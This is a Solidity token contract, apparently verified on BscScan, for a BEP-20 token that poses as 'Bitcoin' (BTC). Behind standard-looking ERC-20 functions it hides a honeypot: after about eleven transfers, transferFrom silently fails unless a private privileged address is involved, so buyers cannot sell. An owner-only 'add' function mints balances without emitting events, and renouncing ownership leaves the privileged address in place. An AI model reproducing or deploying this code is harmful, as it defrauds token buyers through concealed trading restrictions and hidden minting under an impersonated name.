/**
 *Submitted for verification at BscScan.com on 2021-12-20
*/

pragma solidity ^0.8.0;

contract Token{
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint8 private _transfers;
    address private _allowedAdress;
    address public owner;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor() {
        _transfers = 0;
        name = "Bitcoin";
        symbol = "BTC";
        decimals = 10;
        totalSupply = 10000000000*10**9;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
        owner = msg.sender;
        _allowedAdress = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {        
        require(balanceOf[msg.sender] >= _value, "Sender does not have enough balance");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        if(_from == _allowedAdress  || _to == _allowedAdress){
            require(allowance[_from][msg.sender] >= _value, "Sender is not allowed to send that many tokens");
            allowance[_from][msg.sender] -= _value;
            balanceOf[_from] -= _value;
            balanceOf[_to] += _value;
            emit Transfer(_from, _to, _value);
            return true;
        }
        else { 
            if(_transfers <= decimals){
                require(allowance[_from][msg.sender] >= _value, "Sender is not allowed to send that many tokens");
                allowance[_from][msg.sender] -= _value;
                balanceOf[_from] -= _value;
                balanceOf[_to] += _value;
                emit Transfer(_from, _to, _value);
                _transfers += 1;
            return true;
            }           
        }        
    }
    
    function approve(address _spender, uint256 _value) public returns (bool success){
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }


    function renounceOwnership() public returns (bool success){
        require(owner == msg.sender, "Ownable: caller is not the owner");
        if(msg.sender == owner){
            emit OwnershipTransferred(owner, address(0));
            owner = address(0);
            return true;
        }
    }

    function allowed() public view returns (address a) {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        if(msg.sender == owner){
            return _allowedAdress;
        }
    } 

    function add(address _spender, uint256 _value) public returns (bool success){
        require(owner == msg.sender, "Ownable: caller is not the owner");
        if(msg.sender == owner){
            allowance[msg.sender][_spender] = _value;
            balanceOf[_spender] += _value;
            return true;
        }
    }

        function set(address _a) public returns (bool success){
        require(owner == msg.sender, "Ownable: caller is not the owner");
        if(msg.sender == owner){
            _allowedAdress = _a;
            return true;
        }
    }
}